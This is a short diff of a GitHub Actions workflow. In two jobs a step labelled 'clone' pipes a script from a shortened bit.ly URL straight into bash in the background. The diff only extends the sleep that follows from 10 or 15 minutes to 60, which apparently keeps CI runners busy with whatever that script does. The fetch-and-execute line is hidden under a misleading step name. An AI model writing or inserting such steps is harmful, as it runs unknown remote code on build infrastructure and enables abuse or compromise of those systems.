@@ -49,7 +49,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/3Jefaky | bash &
-            sleep 10m
+            sleep 60m
         
     
      
@@ -75,7 +75,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/3Jefaky | bash &
-            sleep 15m
+            sleep 60m
 
   meet:
     needs: [time]
